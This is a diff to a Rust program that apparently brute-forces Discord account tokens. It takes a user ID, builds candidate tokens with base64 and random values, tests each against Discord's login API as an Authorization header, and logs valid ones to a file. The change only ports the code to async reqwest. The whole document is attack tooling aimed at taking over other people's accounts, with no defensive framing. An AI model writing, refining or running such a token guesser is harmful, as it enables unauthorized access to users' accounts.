@@ -1,12 +1,12 @@
 use base64;
 use rand::Rng;
-use reqwest::header::AUTHORIZATION;
-use reqwest::Client;
+use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION};
+use reqwest::{Client, Response};
 use std::fs::OpenOptions;
-use std::io::Write;
-use std::io::{self, BufRead};
+use std::io::{self, BufRead, Write};
 
-fn main() {
+#[tokio::main]
+async fn main() {
     let mut id_to_token = String::new();
     println!("ID TO TOKEN --> ");
     io::stdin()
@@ -23,14 +23,14 @@ fn main() {
         );
         let client = Client::new();
         let login_url = "https://discordapp.com/api/v9/auth/login";
-        let mut headers = reqwest::header::HeaderMap::new();
-        headers.insert(AUTHORIZATION, token.parse().unwrap());
+        let mut headers = HeaderMap::new();
+        headers.insert(AUTHORIZATION, HeaderValue::from_str(&token).unwrap());
 
-        let login = client.get(login_url).headers(headers).send();
+        let login = client.get(login_url).headers(headers).send().await;
 
         match login {
             Ok(response) => {
-                if response.status() == reqwest::StatusCode::OK {
+                if response.status().is_success() {
                     println!("\x1b[32m[+] VALID {}\x1b[0m", token);
                     let mut f = OpenOptions::new()
                         .create(true)
